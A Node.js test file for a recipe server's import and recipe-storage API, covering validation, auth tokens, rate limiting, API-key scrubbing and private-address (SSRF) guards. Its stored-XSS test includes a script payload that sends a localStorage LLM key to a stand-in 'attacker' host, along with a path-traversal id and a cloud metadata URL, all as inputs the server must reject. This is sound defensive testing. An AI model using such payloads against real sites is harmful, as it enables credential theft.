// Recipe import and user recipe endpoints. Every server runs on its own temporary SQLite file (FLOW_DB_PATH), so
// nothing is written to the committed src/database.sqlite.

const test = require('node:test');
const assert = require('node:assert');
const { spawn } = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');

const SERVER = path.join(__dirname, '..', 'src', 'index.js');
const RECIPES_DIR = path.join(__dirname, '..', 'src', 'recipes');
const IMPORTER = path.join(__dirname, '..', '..', 'importer', 'src', 'index.js');
const TIMEOUT_MS = 15000;
const HAS_IMPORTER = fs.existsSync(IMPORTER);
const needsImporter = HAS_IMPORTER ? {} : { skip: '@flow-recipe/importer not present' };
// metricizeRecipeXml / DENSITIES come from @flow-recipe/scheduler (conversions module).
const HAS_CONVERSIONS = (() => {
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'scheduler', 'package.json'), 'utf-8'));
    return !!(pkg.exports && pkg.exports['./conversions']);
  } catch (error) {
    return false;
  }
})();
const needsConversions = HAS_IMPORTER && HAS_CONVERSIONS ? {} : { skip: 'scheduler conversions not present' };

const SANDWICH_XML = fs.readFileSync(path.join(RECIPES_DIR, 'sandwich.xml'), 'utf-8');
const BUNS_XML = fs.readFileSync(path.join(RECIPES_DIR, 'buns.xml'), 'utf-8');
const SECRET_KEY = 'sk-test-secret-key-0123456789';

function startServer(extraEnv = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-recipe-import-test-'));
  const dbPath = path.join(dir, 'test.sqlite');
  const env = { ...process.env, PORT: '0', FLOW_DB_PATH: dbPath, NODE_ENV: 'test', FLOW_INTERRUPT_CHECK_MS: '500' };
  for (const key of ['FLOW_LLM_PROVIDER', 'FLOW_LLM_MODEL', 'FLOW_LLM_API_KEY', 'FLOW_LLM_BASE_URL', 'ANTHROPIC_API_KEY',
    'OPENAI_API_KEY', 'FLOW_UPLOAD_TOKEN', 'FLOW_ALLOW_MOCK_LLM', 'FLOW_IMPORT_ALLOW_PRIVATE', 'FLOW_LLM_ALLOW_PRIVATE',
    'FLOW_CHECK_RATE_LIMIT', 'FLOW_CHECK_MAX_BYTES', 'FLOW_TRUST_PROXY']) {
    delete env[key];
  }
  env.FLOW_CHECK_RATE_LIMIT = '1000';
  for (const [key, value] of Object.entries(extraEnv)) {
    if (value === undefined) delete env[key];
    else env[key] = value;
  }
  const child = spawn(process.execPath, [SERVER], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let output = '';
  const ready = new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`server did not start:\n${output}`)), TIMEOUT_MS);
    child.stdout.on('data', (chunk) => {
      output += chunk.toString();
      const match = output.match(/Server running on port (\d+)/);
      if (match) {
        clearTimeout(timer);
        resolve(`http://127.0.0.1:${match[1]}`);
      }
    });
    child.stderr.on('data', (chunk) => {
      output += chunk.toString();
    });
    child.on('exit', (code) => {
      clearTimeout(timer);
      reject(new Error(`server exited with ${code}:\n${output}`));
    });
  });
  return {
    dbPath,
    ready,
    output: () => output,
    stop: () =>
      new Promise((resolve) => {
        if (child.exitCode !== null) return resolve();
        child.once('exit', () => resolve());
        child.kill('SIGTERM');
      }).then(() => fs.rmSync(dir, { recursive: true, force: true })),
  };
}

// A local http server: /recipe.html (a JSON-LD recipe page) and /llm/chat/completions (a failing fake LLM that
// echoes the Authorization header, to prove the key is scrubbed).
function startFixtureServer() {
  const page = `<!doctype html><html><head><title>Simple Butter Sandwich</title>
<script type="application/ld+json">${JSON.stringify({
    '@context': 'https://schema.org',
    '@type': 'Recipe',
    name: 'Simple Butter Sandwich',
    recipeYield: '1 sandwich',
    recipeIngredient: ['2 slices bread', '1 tbsp butter'],
    recipeInstructions: [{ '@type': 'HowToStep', text: 'Spread the butter on the bread.' }],
  })}</script></head><body><h1>Simple Butter Sandwich</h1><p>Spread the butter on the bread.</p></body></html>`;
  const server = http.createServer((req, res) => {
    if (req.url === '/recipe.html') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(page);
    }
    if (req.url.startsWith('/llm/')) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: { message: `bad request with ${req.headers.authorization}` } }));
    }
    res.writeHead(404);
    res.end('not found');
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      resolve({ url: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((r) => server.close(r)) });
    });
  });
}

async function request(method, url, data, headers = {}) {
  const init = { method, headers: { ...headers } };
  if (data !== undefined) {
    init.headers['Content-Type'] = 'application/json';
    init.body = typeof data === 'string' ? data : JSON.stringify(data);
  }
  const res = await fetch(url, init);
  const text = await res.text();
  let body = text;
  try {
    body = JSON.parse(text);
  } catch (error) {
    // XML or plain text
  }
  return { status: res.status, body, headers: res.headers };
}

async function waitForJob(base, jobId) {
  const deadline = Date.now() + TIMEOUT_MS;
  for (;;) {
    const { status, body } = await request('GET', `${base}/api/import/${jobId}`);
    assert.strictEqual(status, 200);
    if (body.status !== 'running') return body;
    if (Date.now() > deadline) throw new Error(`job ${jobId} still running: ${JSON.stringify(body)}`);
    await new Promise((r) => setTimeout(r, 100));
  }
}

test('server: recipe import and user recipes', async (t) => {
  const server = startServer({ FLOW_IMPORT_ALLOW_PRIVATE: '1', FLOW_LLM_ALLOW_PRIVATE: '1' });
  const fixtures = await startFixtureServer();
  t.after(async () => {
    await fixtures.close();
    await server.stop();
  });
  const base = await server.ready;

  await t.test('GET /api/recipes keeps { id, title, serving } and adds source fields', async () => {
    const { status, body } = await request('GET', `${base}/api/recipes`);
    assert.strictEqual(status, 200);
    const buns = body.find((r) => r.id === 'buns');
    assert.ok(buns);
    assert.strictEqual(buns.title, 'Buns');
    assert.deepStrictEqual(buns.serving, { temperature: 'hot', hold: 600 });
    assert.strictEqual(buns.source, 'builtin');
    assert.strictEqual(buns.sourceUrl, null);
    assert.ok(!body.some((r) => r.id === 'operations'));
  });

  await t.test('GET /api/llm describes the (absent) server LLM', async () => {
    const { status, body } = await request('GET', `${base}/api/llm`);
    assert.strictEqual(status, 200);
    assert.strictEqual(body.server, null);
    assert.deepStrictEqual(body.providers, ['anthropic', 'openai', 'openai-compatible', 'ollama']);
  });

  await t.test('POST /api/import validates its input', async () => {
    let res = await request('POST', `${base}/api/import`, {});
    assert.strictEqual(res.status, 400);
    res = await request('POST', `${base}/api/import`, { url: 'ftp://example.com/x' });
    assert.strictEqual(res.status, 400);
    res = await request('POST', `${base}/api/import`, { url: 'not a url' });
    assert.strictEqual(res.status, 400);
    res = await request('POST', `${base}/api/import`, { text: 'x'.repeat(1024 * 1024 + 1) });
    assert.strictEqual(res.status, 413);
  });

  await t.test('POST /api/recipes validates ids, size and xml', async () => {
    let res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'buns' });
    assert.strictEqual(res.status, 409, 'built-in id');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'Buns' });
    assert.strictEqual(res.status, 409, 'built-in id, other case');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'operations' });
    assert.strictEqual(res.status, 409, 'operations');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: '../etc/passwd' });
    assert.strictEqual(res.status, 400, 'invalid id');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'a'.repeat(101) });
    assert.strictEqual(res.status, 400, 'too long id');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 409, 'id from the <recipe id> attribute is built-in');
    res = await request('POST', `${base}/api/recipes`, { xml: '<notarecipe/>', id: 'x' });
    assert.strictEqual(res.status, 400);
    res = await request('POST', `${base}/api/recipes`, { id: 'x' });
    assert.strictEqual(res.status, 400);
    const big = SANDWICH_XML.replace('</recipe>', `<!-- ${'x'.repeat(1024 * 1024)} --></recipe>`);
    res = await request('POST', `${base}/api/recipes`, { xml: big, id: 'big' });
    assert.strictEqual(res.status, 413);
    res = await request('POST', `${base}/api/recipes`, '{"xml": ');
    assert.strictEqual(res.status, 400, 'malformed JSON');
  });

  await t.test('DELETE and PUT refuse built-in and unknown recipes', async () => {
    let res = await request('DELETE', `${base}/api/recipes/buns`);
    assert.strictEqual(res.status, 403);
    res = await request('DELETE', `${base}/api/recipes/nope`);
    assert.strictEqual(res.status, 404);
    res = await request('PUT', `${base}/api/recipes/buns`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 409);
    res = await request('PUT', `${base}/api/recipes/nope`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 404);
    res = await request('GET', `${base}/api/recipes/nope`);
    assert.strictEqual(res.status, 404);
  });

  await t.test('GET /api/conversions returns the density table', needsConversions, async () => {
    const { status, body } = await request('GET', `${base}/api/conversions`);
    assert.strictEqual(status, 200);
    assert.ok(Array.isArray(body) && body.length > 0);
    assert.ok(body.every((d) => typeof d.id === 'string' && typeof d.gPerMl === 'number'));
  });

  await t.test('POST /api/recipes/check returns a CheckResult', needsImporter, async () => {
    let res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(typeof res.body.ok, 'boolean');
    assert.ok(Array.isArray(res.body.errors));
    assert.ok(Array.isArray(res.body.warnings));
    assert.strictEqual(res.body.ok, true, JSON.stringify(res.body.errors));
    res = await request('POST', `${base}/api/recipes/check`, { xml: '<recipe><unclosed></recipe>' });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.body.ok, false);
    assert.ok(res.body.errors.length > 0);
    if (HAS_CONVERSIONS) {
      res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML, metricize: true });
      assert.strictEqual(res.status, 200);
      assert.strictEqual(typeof res.body.xml, 'string');
      assert.ok(Array.isArray(res.body.changes));
    }
    res = await request('POST', `${base}/api/recipes/check`, {});
    assert.strictEqual(res.status, 400);
  });

  await t.test('POST /api/recipes/convert metricizes the XML', needsConversions, async () => {
    const res = await request('POST', `${base}/api/recipes/convert`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(typeof res.body.xml, 'string');
    assert.ok(Array.isArray(res.body.changes));
    assert.ok(Array.isArray(res.body.warnings));
  });

  await t.test('POST /api/recipes rejects a recipe with errors (422)', needsImporter, async () => {
    const broken = SANDWICH_XML.replace(/operation="[^"]+"/, 'operation="no-such-operation-xyz"');
    const res = await request('POST', `${base}/api/recipes`, { xml: broken, id: 'broken-sandwich' });
    assert.strictEqual(res.status, 422);
    assert.ok(res.body.check && res.body.check.errors.length > 0);
  });

  await t.test('POST /api/recipes saves, lists, serves, updates and deletes a user recipe', needsImporter, async () => {
    let res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'my-sandwich' });
    assert.strictEqual(res.status, 201, JSON.stringify(res.body));
    assert.strictEqual(res.body.id, 'my-sandwich');
    assert.strictEqual(res.body.title, 'Simple Butter Sandwich');
    assert.strictEqual(res.body.check.ok, true);

    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'my-sandwich' });
    assert.strictEqual(res.status, 409, 'exists');
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'my-sandwich', overwrite: true });
    assert.strictEqual(res.status, 201, 'overwrite');

    res = await request('GET', `${base}/api/recipes`);
    const mine = res.body.find((r) => r.id === 'my-sandwich');
    assert.ok(mine, 'listed');
    assert.strictEqual(mine.source, 'imported');
    assert.strictEqual(mine.title, 'Simple Butter Sandwich');
    assert.ok('serving' in mine && 'sourceUrl' in mine);

    res = await request('GET', `${base}/api/recipes/my-sandwich`);
    assert.strictEqual(res.status, 200);
    assert.match(res.headers.get('content-type'), /application\/xml/);
    // The root id is rewritten to the id the recipe is stored under (it was "sandwich").
    assert.strictEqual(res.body, SANDWICH_XML.replace(/(<recipe\b[^>]*\sid=)"sandwich"/, '$1"my-sandwich"'));
    assert.match(res.body, /<recipe\b[^>]*\sid="my-sandwich"/);
    // Served as inert data: no sniffing, no scripts, no resources.
    assert.strictEqual(res.headers.get('x-content-type-options'), 'nosniff');
    assert.strictEqual(res.headers.get('content-security-policy'), "default-src 'none'; sandbox");
    assert.match(res.headers.get('content-disposition'), /^inline; filename="my-sandwich\.xml"$/);

    // A session can use the user recipe.
    res = await request('POST', `${base}/api/sessions`, { sessionId: 'import-test', dishes: [{ recipeId: 'my-sandwich' }] });
    assert.strictEqual(res.status, 201, JSON.stringify(res.body));
    assert.strictEqual(res.body.session.dishes[0].title, 'Simple Butter Sandwich');

    const renamed = SANDWICH_XML.replace(/<title>[^<]*<\/title>/, '<title>Renamed Sandwich</title>');
    res = await request('PUT', `${base}/api/recipes/my-sandwich`, { xml: renamed });
    assert.strictEqual(res.status, 200, JSON.stringify(res.body));
    assert.strictEqual(res.body.title, 'Renamed Sandwich');
    res = await request('GET', `${base}/api/recipes`);
    assert.strictEqual(res.body.find((r) => r.id === 'my-sandwich').title, 'Renamed Sandwich');

    res = await request('DELETE', `${base}/api/recipes/my-sandwich`);
    assert.strictEqual(res.status, 200);
    res = await request('GET', `${base}/api/recipes/my-sandwich`);
    assert.strictEqual(res.status, 404);
  });

  await t.test('POST /api/recipes refuses foreign elements, namespaces and processing instructions (stored XSS)', needsImporter, async () => {
    const script = '<h:script xmlns:h="http://www.w3.org/1999/xhtml">fetch("https://attacker/?k="+localStorage.getItem("flow-recipe-llm"))</h:script>';
    const cases = {
      'xhtml-script': SANDWICH_XML.replace('</title>', `</title>${script}`),
      'plain-script': SANDWICH_XML.replace('</title>', '</title><script>alert(1)</script>'),
      'default-ns': SANDWICH_XML.replace('<recipe ', '<recipe xmlns="http://www.w3.org/1999/xhtml" '),
      stylesheet: SANDWICH_XML.replace(/(<\?xml[^?]*\?>)/, '$1<?xml-stylesheet type="text/xsl" href="https://attacker/x.xsl"?>'),
      'unknown-element': SANDWICH_XML.replace('</title>', '</title><notes>hi</notes>'),
    };
    for (const [id, xml] of Object.entries(cases)) {
      assert.notStrictEqual(xml, SANDWICH_XML, id);
      let res = await request('POST', `${base}/api/recipes`, { xml, id: `evil-${id}` });
      assert.strictEqual(res.status, 422, `${id}: ${JSON.stringify(res.body)}`);
      res = await request('GET', `${base}/api/recipes/evil-${id}`);
      assert.strictEqual(res.status, 404, id);
      res = await request('POST', `${base}/api/recipes/check`, { xml });
      assert.strictEqual(res.body.ok, false, id);
    }
  });

  await t.test('POST /api/recipes stores the given id in the root element', needsImporter, async () => {
    let res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML.replace(/\sid="sandwich"/, ' id="whatever"'), id: 'my-cookies' });
    assert.strictEqual(res.status, 201, JSON.stringify(res.body));
    res = await request('GET', `${base}/api/recipes/my-cookies`);
    assert.match(res.body, /<recipe\b[^>]*\sid="my-cookies"/);
    assert.doesNotMatch(res.body, /id="whatever"/);
    await request('DELETE', `${base}/api/recipes/my-cookies`);
  });

  await t.test('check and convert answer 422, not 500, for XML the converter cannot parse', needsConversions, async () => {
    for (const xml of ['<recipe><title>x</title', '<!DOCTYPE r [<!ENTITY a "aaa">]><recipe>&a;</recipe>']) {
      let res = await request('POST', `${base}/api/recipes/convert`, { xml });
      assert.strictEqual(res.status, 422, `convert ${xml}: ${JSON.stringify(res.body)}`);
      assert.strictEqual(typeof res.body.error, 'string');
      res = await request('POST', `${base}/api/recipes/check`, { xml, metricize: true });
      assert.strictEqual(res.status, 422, `check ${xml}: ${JSON.stringify(res.body)}`);
      assert.strictEqual(res.body.ok, false);
    }
  });

  await t.test('check refuses oversized XML', needsImporter, async () => {
    const big = SANDWICH_XML.replace('</recipe>', `<!-- ${'x'.repeat(300 * 1024)} --></recipe>`);
    const res = await request('POST', `${base}/api/recipes/check`, { xml: big });
    assert.strictEqual(res.status, 413);
  });

  await t.test('POST /api/import result id matches the root id and avoids taken ids', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, { text: 'Buns: bake buns.', llm: { provider: 'mock', mockResponse: BUNS_XML } });
    assert.strictEqual(res.status, 202);
    const job = await waitForJob(base, res.body.jobId);
    assert.strictEqual(job.status, 'done', JSON.stringify(job.error));
    assert.notStrictEqual(job.result.id, 'buns');
    assert.strictEqual(job.result.check.id, job.result.id);
    assert.match(job.result.xml, new RegExp(`<recipe\\b[^>]*\\sid="${job.result.id}"`));
    // Saving it without an explicit id uses that root id.
    const saved = await request('POST', `${base}/api/recipes`, { xml: job.result.xml });
    assert.strictEqual(saved.status, 201, JSON.stringify(saved.body));
    assert.strictEqual(saved.body.id, job.result.id);
    await request('DELETE', `${base}/api/recipes/${saved.body.id}`);
  });

  await t.test('POST /api/import runs a job with the mock LLM on a fetched page', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, {
      url: `${fixtures.url}/recipe.html`,
      precisionScale: true,
      llm: { provider: 'mock', mockResponse: BUNS_XML },
    });
    assert.strictEqual(res.status, 202, JSON.stringify(res.body));
    assert.strictEqual(typeof res.body.jobId, 'string');
    const job = await waitForJob(base, res.body.jobId);
    assert.strictEqual(job.status, 'done', JSON.stringify(job.error));
    assert.strictEqual(job.stage, 'done');
    assert.ok(job.result && typeof job.result.xml === 'string');
    assert.ok(job.result.check && typeof job.result.check.ok === 'boolean');
    assert.notStrictEqual(job.result.id, 'buns', 'suggested id avoids the built-in id');
    assert.strictEqual(job.result.source.url, `${fixtures.url}/recipe.html`);
  });

  await t.test('POST /api/import with pasted text', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, {
      text: 'Butter sandwich: spread 1 tbsp butter on 2 slices of bread.',
      llm: { provider: 'mock', mockResponse: SANDWICH_XML },
    });
    assert.strictEqual(res.status, 202);
    const job = await waitForJob(base, res.body.jobId);
    assert.strictEqual(job.status, 'done', JSON.stringify(job.error));
  });

  await t.test('import errors are captured in the job and never leak the API key', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, {
      url: `${fixtures.url}/recipe.html`,
      llm: { provider: 'openai-compatible', model: 'x', apiKey: SECRET_KEY, baseUrl: `${fixtures.url}/llm` },
    });
    assert.strictEqual(res.status, 202, JSON.stringify(res.body));
    const job = await waitForJob(base, res.body.jobId);
    assert.strictEqual(job.status, 'error');
    assert.strictEqual(typeof job.error, 'string');
    // The body of a client-supplied endpoint is never echoed (it may be an internal service): status code only.
    assert.match(job.error, /HTTP 500/);
    assert.doesNotMatch(job.error, /bad request with/);
    assert.ok(!JSON.stringify(job).includes(SECRET_KEY), 'job does not contain the key');
    assert.ok(!server.output().includes(SECRET_KEY), 'logs do not contain the key');
  });

  await t.test('GET and DELETE /api/import/:jobId for unknown jobs', async () => {
    let res = await request('GET', `${base}/api/import/nope`);
    assert.strictEqual(res.status, 404);
    res = await request('DELETE', `${base}/api/import/nope`);
    assert.strictEqual(res.status, 404);
  });

  await t.test('POST /api/import without an LLM is refused', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, { url: `${fixtures.url}/recipe.html` });
    assert.strictEqual(res.status, 400);
    assert.strictEqual(res.body.error, 'No LLM configured');
  });

  await t.test('POST /api/import rejects unknown providers', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, { url: `${fixtures.url}/recipe.html`, llm: { provider: 'acme' } });
    assert.strictEqual(res.status, 400);
  });
});

test('server: upload token, mock gating and private address guard', async (t) => {
  const server = startServer({ NODE_ENV: 'development', FLOW_UPLOAD_TOKEN: 'secret-token' });
  const fixtures = await startFixtureServer();
  t.after(async () => {
    await fixtures.close();
    await server.stop();
  });
  const base = await server.ready;
  const auth = { Authorization: 'Bearer secret-token' };

  await t.test('writes need the bearer token, reads stay open', async () => {
    let res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'x' });
    assert.strictEqual(res.status, 401);
    res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML, id: 'x' }, { Authorization: 'Bearer wrong' });
    assert.strictEqual(res.status, 401);
    res = await request('PUT', `${base}/api/recipes/x`, { xml: SANDWICH_XML });
    assert.strictEqual(res.status, 401);
    res = await request('DELETE', `${base}/api/recipes/x`);
    assert.strictEqual(res.status, 401);
    res = await request('POST', `${base}/api/import`, { url: 'https://example.com/' });
    assert.strictEqual(res.status, 401);
    res = await request('GET', `${base}/api/recipes`);
    assert.strictEqual(res.status, 200);
    res = await request('DELETE', `${base}/api/recipes/nope`, undefined, auth);
    assert.strictEqual(res.status, 404, 'authorised request gets through');
  });

  await t.test('the mock provider is refused outside tests', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`,
      { url: `${fixtures.url}/recipe.html`, llm: { provider: 'mock', mockResponse: SANDWICH_XML } }, auth);
    assert.strictEqual(res.status, 400);
    assert.match(res.body.error, /mock/);
  });

  await t.test('POST /api/import refuses a private llm.baseUrl unless the operator allows it', needsImporter, async () => {
    for (const baseUrl of [`${fixtures.url}/llm`, 'http://localhost:4888/v1', 'http://[::ffff:7f00:1]:4888/v1', 'http://169.254.169.254/latest']) {
      const res = await request('POST', `${base}/api/import`, {
        text: 'Pancakes: mix 1 cup flour with 1 cup milk.',
        llm: { provider: 'openai-compatible', apiKey: SECRET_KEY, baseUrl },
      }, auth);
      assert.strictEqual(res.status, 400, `${baseUrl}: ${JSON.stringify(res.body)}`);
      assert.match(res.body.error, /llm\.baseUrl/);
    }
    // Ollama's default (localhost) is the operator's business too.
    let res = await request('POST', `${base}/api/import`, { text: 'Pancakes', llm: { provider: 'ollama' } }, auth);
    assert.strictEqual(res.status, 400, JSON.stringify(res.body));
    // A query string would let the caller pick the upstream path.
    res = await request('POST', `${base}/api/import`, {
      text: 'Pancakes', llm: { provider: 'openai-compatible', apiKey: SECRET_KEY, baseUrl: 'https://example.com/admin?x=' },
    }, auth);
    assert.strictEqual(res.status, 400);
  });

  await t.test('private addresses are not fetched without FLOW_IMPORT_ALLOW_PRIVATE', needsImporter, async () => {
    const res = await request('POST', `${base}/api/import`, {
      url: `${fixtures.url}/recipe.html`,
      llm: { provider: 'openai', apiKey: SECRET_KEY },
    }, auth);
    assert.strictEqual(res.status, 202);
    const job = await waitForJob(base, res.body.jobId);
    assert.strictEqual(job.status, 'error');
    assert.match(job.error, /private/);
    assert.ok(!server.output().includes(SECRET_KEY));
  });
});

test('server: recipe check endpoints are rate limited per client', needsImporter, async (t) => {
  const server = startServer({ FLOW_CHECK_RATE_LIMIT: '2' });
  t.after(() => server.stop());
  const base = await server.ready;
  let res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML });
  assert.strictEqual(res.status, 200);
  res = await request('POST', `${base}/api/recipes/convert`, { xml: SANDWICH_XML });
  assert.notStrictEqual(res.status, 429);
  res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML });
  assert.strictEqual(res.status, 429);
  assert.ok(Number(res.headers.get('retry-after')) > 0);
});

test('server: a private LLM base URL configured by the operator is allowed for clients', needsImporter, async (t) => {
  const fixtures = await startFixtureServer();
  const server = startServer({ FLOW_LLM_PROVIDER: 'ollama', FLOW_LLM_BASE_URL: `${fixtures.url}/llm` });
  t.after(async () => {
    await fixtures.close();
    await server.stop();
  });
  const base = await server.ready;
  let res = await request('POST', `${base}/api/import`, { text: 'Toast: toast bread.', llm: { provider: 'ollama', baseUrl: `${fixtures.url}/llm/` } });
  assert.strictEqual(res.status, 202, JSON.stringify(res.body));
  const job = await waitForJob(base, res.body.jobId);
  assert.strictEqual(job.status, 'error');
  assert.match(job.error, /HTTP 500/, 'reached the operator-configured endpoint');
  res = await request('POST', `${base}/api/import`, { text: 'Toast', llm: { provider: 'ollama', baseUrl: `${fixtures.url}/other` } });
  assert.strictEqual(res.status, 400, 'another private URL is still refused');
});

test('importer: private address detection used by the server', async () => {
  const { isPrivateAddress } = await import(require('node:url').pathToFileURL(IMPORTER).href);
  for (const a of ['127.0.0.1', '10.1.2.3', '192.168.0.1', '172.16.5.4', '169.254.169.254', '::1', '::ffff:127.0.0.1', 'fd00::1', '0.0.0.0',
    '::ffff:7f00:1', '::7f00:1', '64:ff9b::7f00:1', '2002:7f00:1::', 'fec0::1', '198.18.0.1']) {
    assert.strictEqual(isPrivateAddress(a), true, a);
  }
  for (const a of ['93.184.216.34', '1.1.1.1', '2606:4700:4700::1111']) {
    assert.strictEqual(isPrivateAddress(a), false, a);
  }
});
